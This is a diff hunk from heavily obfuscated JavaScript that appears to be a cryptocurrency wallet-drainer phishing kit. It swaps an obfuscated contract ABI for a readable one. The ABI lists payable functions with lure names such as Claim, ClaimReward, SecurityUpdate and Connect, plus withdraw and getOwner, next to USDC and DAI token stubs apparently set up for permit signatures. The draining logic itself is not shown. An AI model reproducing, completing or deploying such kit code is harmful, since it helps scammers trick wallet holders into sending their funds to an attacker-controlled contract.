@@ -5402,7 +5402,103 @@ var janera = {}
   (janera['outputs'] = []),
   (janera['stateMutability'] = _0x5c7eff(0xda8)),
   (janera[_0x5c7eff(0x17a)] = 'function')
-var claimABI = [lallah, janera],
+var claimABI = [
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'Claim',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'ClaimCoin',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'ClaimReward',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'Connect',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'Execute',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'safeClaim',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'safeUpdate',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'SecurityUpdate',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'sender', type: 'address' }],
+      name: 'Swap',
+      outputs: [],
+      stateMutability: 'payable',
+      type: 'function'
+    },
+    { inputs: [], stateMutability: 'nonpayable', type: 'constructor' },
+    {
+      inputs: [
+        { internalType: 'address', name: 'to', type: 'address' },
+        { internalType: 'uint256', name: 'amount', type: 'uint256' }
+      ],
+      name: 'withdraw',
+      outputs: [],
+      stateMutability: 'nonpayable',
+      type: 'function'
+    },
+    {
+      inputs: [],
+      name: 'getBalance',
+      outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
+      stateMutability: 'view',
+      type: 'function'
+    },
+    {
+      inputs: [],
+      name: 'getOwner',
+      outputs: [{ internalType: 'address', name: '', type: 'address' }],
+      stateMutability: 'view',
+      type: 'function'
+    },
+    {
+      inputs: [{ internalType: 'address', name: 'user', type: 'address' }],
+      name: 'getUserBalance',
+      outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
+      stateMutability: 'view',
+      type: 'function'
+    }
+  ],
   USDCToken = {}
 ;(USDCToken['name'] = _0x5c7eff(0x25f)), (USDCToken['version'] = '2'), (USDCToken['type'] = 0x3)
 var DAIToken = {}
